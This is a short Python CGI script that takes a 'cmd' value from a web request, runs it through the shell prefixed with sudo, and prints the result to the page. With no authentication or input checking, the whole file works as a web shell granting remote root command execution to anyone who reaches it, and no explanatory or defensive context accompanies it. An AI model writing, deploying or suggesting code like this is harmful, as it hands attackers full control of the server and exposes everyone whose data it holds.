#!/bin/python3
print("content-type:text/html")
print()

import cgi
import subprocess
data=cgi.FieldStorage()
command=data.getvalue("cmd")
print(command)
output=subprocess.getstatusoutput("sudo {}".format(command))
print(output[1])








